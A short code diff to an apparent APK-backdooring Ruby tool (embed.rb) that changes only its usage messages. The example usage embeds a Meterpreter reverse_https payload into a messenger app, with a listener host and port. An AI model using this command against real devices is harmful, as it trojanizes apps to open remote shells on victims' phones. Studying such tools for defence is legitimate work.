@@ -144,8 +144,8 @@ end
 
 apkfile = ARGV[0]
 unless(apkfile && File.readable?(apkfile))
-  puts "[Usage]─➤ ruby embed.rb [target.apk] [msfvenom options]\n".cyan
-  puts "[ex]─➤ ruby embed.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
+  puts "[Usage]─➤ embed.rb [target.apk] [msfvenom options]\n".cyan
+  puts "[ex]─➤ embed.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
   exit(1)
 end
 
